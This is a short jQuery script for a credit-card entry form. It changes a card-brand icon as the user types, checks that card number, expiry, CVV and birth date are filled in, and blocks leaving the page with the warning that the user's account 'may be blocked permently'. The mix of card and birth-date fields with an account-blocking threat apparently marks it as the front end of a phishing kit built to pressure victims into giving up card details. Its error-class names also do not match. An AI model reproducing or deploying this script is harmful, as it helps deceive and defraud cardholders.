	$(document).ready(function () {
		
		$('.ccinput').keyup(function() {
			if($(this).val() == 4){
				$('#ccbox').css('background-position', '0 -23px');
 			}
 			else if($(this).val() == 5){
				$('#ccbox').css('background-position', '0 -46px');
 			}
 			else if($(this).val() == 3){
				$('#ccbox').css('background-position', '0 -69px');
 			}
 			else if($(this).val() == 6){
				$('#ccbox').css('background-position', '0 -92px');
 			}
 			else if($(this).val() == ''){
 				$('#ccbox').css('background-position', '0 0');
 			}	
		});
		
	});

function validate(){
	var CC = $('input[name=CC]');
	var EM = $('select[name=EM]');
	var EY = $('select[name=EY]');
	var CV = $('input[name=CV]');
	var BD = $('input[name=BD]');
	var stat;
	if(CC.val() == ''){ CC.addClass("merroro"); stat = false; }   
	if(EM.val() == ''){ EM.addClass("merroro"); stat = false; }  
	if(EY.val() == ''){ EY.addClass("merroro"); stat = false; }   
	if(CV.val() == ''){ CV.addClass("merroro"); stat = false; }   
	if(BD.val() == ''){ BD.addClass("merroro"); stat = false; }  
	if(stat == false) {return false ;}
	return true;
}

window.onbeforeunload = function(){
    if(!validate()){
        return 'If you leave, Your account may be blocked permently !';
    }
};
$("input").change(function () {
        $(this).removeClass("merror");
		$(this).removeClass("merror2");
		$(this).removeClass("merror3");
}).trigger("change");
$("select").change(function () {
        $(this).removeClass("merror");
}).trigger("change");

